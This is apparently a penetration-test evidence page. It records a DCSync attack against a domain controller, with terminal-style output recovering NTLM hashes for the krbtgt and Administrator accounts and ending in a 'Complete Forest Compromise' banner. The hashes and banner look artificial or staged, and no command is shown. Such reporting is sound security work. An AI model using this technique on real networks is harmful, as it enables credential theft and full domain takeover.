# Evidence 06: Domain Administrator Compromise (DCSync)

**Execution Context:** Elevated administrative context on `APP01` targeting `DC01`  
**Technique:** Directory Replication Service Remote Protocol (MS-DRSR / DCSync)  
**Objective:** Extraction of the `krbtgt` account hash and `Administrator` credentials

---

## Terminal Verification Output

```
[*] Invoking DCSync for domain 'corp.local' against DC 'DC01.corp.local'
[*] Requesting account info for: krbtgt

SAM Username         : krbtgt
User Principal Name  : krbtgt@corp.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE | NORMAL_ACCOUNT )
Account Expiration   : <never>
Password Last Change : 9/9/2026 10:15:32 AM
Object Security ID   : S-1-5-21-3829482910-1849204918-2940294819-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: e50462719f9f8c6b7139d48b4e723223

[*] Requesting account info for: Administrator
SAM Username         : Administrator
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Credentials:
  Hash NTLM: a4b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5

[+] Domain Dominance Achieved: Complete Forest Compromise (Tier-0)
```

---

## Screenshot Reference

![Domain Admin Compromise](06_domain_admin.png)
*(Screenshot: Terminal executing DCSync against DC01 recovering the KRBTGT and Administrator NTLM hashes)*
